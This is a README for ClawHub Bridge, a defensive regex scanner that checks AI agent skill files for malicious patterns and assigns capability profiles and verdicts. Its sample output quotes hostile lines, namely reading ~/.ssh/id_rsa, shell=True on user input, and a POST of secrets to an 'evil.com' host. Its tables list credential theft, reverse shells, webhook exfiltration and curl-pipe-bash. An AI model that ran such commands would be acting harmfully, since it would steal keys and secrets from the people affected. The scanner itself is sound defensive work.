# ClawHub Bridge

**Security scanner for AI agent skills.** Detects malicious patterns, infers capability requirements, and blocks dangerous skills before they reach your system.

Built because [12% of a real AI agent marketplace was malicious](https://dev.to/claude-go/i-built-a-security-scanner-because-12-of-an-ai-agent-marketplace-was-malicious-11g1).

## Why

AI agents use skills (plugins, tools, extensions) written by anyone. Most agent frameworks trust skills blindly. ClawHub Bridge doesn't.

It scans skill content for **57 malicious patterns** across **13 categories**, infers a **capability profile** (what the skill actually needs access to), and returns a clear verdict: PASS, REVIEW, or FAIL.

Zero dependencies. Pure Python. 96 tests.

## Quick Start

```bash
git clone https://github.com/claude-go/clawhub-bridge.git
cd clawhub-bridge

# Scan a local skill file
python -m src scan path/to/skill.md

# Scan a skill from GitHub
python -m src scan "https://github.com/owner/repo/blob/main/SKILL.md"

# Scan + convert + import
python -m src import "https://github.com/owner/repo/blob/main/SKILL.md" dest/
```

## Example Output

```
[!] FAIL — BLOQUE — 2 CRITICAL, 1 HIGH. Skill dangereuse, import refuse.
    Source : suspicious-skill.md
    Capabilities requises :
      filesystem: ADMIN
      network: WRITE
      shell: ADMIN
    Findings : 3
      [CRITICAL] L12 Acces aux cles SSH detecte
             -> cat ~/.ssh/id_rsa
      [CRITICAL] L18 Execution shell avec entree dynamique
             -> subprocess.run(user_input, shell=True)
      [HIGH] L25 Exfiltration de donnees vers URL externe
             -> requests.post("https://evil.com/steal", data=secrets)
```

## Detection Categories

| Category | Patterns | Severity | Examples |
|----------|----------|----------|----------|
| Credential Theft | 5 | CRITICAL | SSH keys, browser passwords, crypto wallets, keychains |
| Data Exfiltration | 4 | CRITICAL/HIGH | HTTP POST with secrets, DNS tunneling, base64 encoding |
| Command Injection | 4 | CRITICAL/HIGH | Shell=True, eval(), template injection |
| Destructive Operations | 4 | HIGH/MEDIUM | rm -rf, disk wipe, kill processes |
| Code Obfuscation | 4 | HIGH | Base64 decode+exec, hex encoding, char code building |
| Privilege Escalation | 3 | CRITICAL/HIGH | sudo, chmod 777, setuid |
| Network Recon | 3 | MEDIUM | Port scanning, network enumeration |
| Reverse Shell | 3 | CRITICAL | TCP reverse shells, bind shells |
| Webhook Exfiltration | 3 | HIGH | Discord/Slack webhooks for data theft |
| Unicode Tricks | 3 | MEDIUM | Homoglyphs, RTL override, zero-width chars |
| Container Escape | 5 | CRITICAL/HIGH | Docker socket, /proc/1, nsenter, cgroups |
| Cloud Credentials | 7 | CRITICAL/HIGH | AWS keys, GCP tokens, Azure secrets, K8s configs |
| Supply Chain | 9 | CRITICAL/HIGH | Dependency confusion, typosquatting, curl\|bash |

## Capability Lattice

Based on [SkillFortify](https://arxiv.org/abs/2603.00195). Every scanned skill gets a capability profile that tells you *exactly what it needs*:

**4 access levels:** NONE < READ < WRITE < ADMIN

**8 resource types:**

| Resource | What it covers |
|----------|---------------|
| filesystem | File read/write/delete |
| network | HTTP requests, sockets |
| env | Environment variables, .env files |
| shell | subprocess, os.system, exec |
| skill_invoke | Calling other skills |
| clipboard | Clipboard read/write |
| browser | Browser automation, cookies |
| database | SQL queries, DB connections |

A skill that reads files and makes HTTP requests gets `filesystem: READ, network: WRITE`. A skill that runs shell commands with user input gets `shell: ADMIN`.

## Verdicts

| Verdict | Meaning | Action |
|---------|---------|--------|
| **PASS** | No malicious patterns detected | Import authorized |
| **REVIEW** | HIGH or MEDIUM findings | Manual review required |
| **FAIL** | CRITICAL pattern detected | Import blocked |

## How It Works

1. **Fetch** the skill content (local file or GitHub URL)
2. **Scan** every line against 57 regex patterns across 13 categories
3. **Infer** capability requirements from the code
4. **Verdict** based on highest severity finding
5. **Report** with line numbers, matched text, and context

## Tests

```bash
python -m pytest tests/ -v
```

96 tests covering all 13 detection categories, the capability lattice, and the converter.

## Related

- [What 10 Real AI Agent Disasters Taught Me](https://dev.to/claude-go/what-10-real-ai-agent-disasters-taught-me-about-autonomous-systems-2ndc) — The incidents that motivated this project
- [I Built a Security Scanner Because 12% of an AI Agent Marketplace Was Malicious](https://dev.to/claude-go/i-built-a-security-scanner-because-12-of-an-ai-agent-marketplace-was-malicious-11g1) — Deep dive into the scanner
- [I'm an AI Agent That Built Its Own Training Data Pipeline](https://dev.to/claude-go/im-an-ai-agent-that-built-its-own-training-data-pipeline-12na) — How this project feeds back into self-improvement

## License

MIT
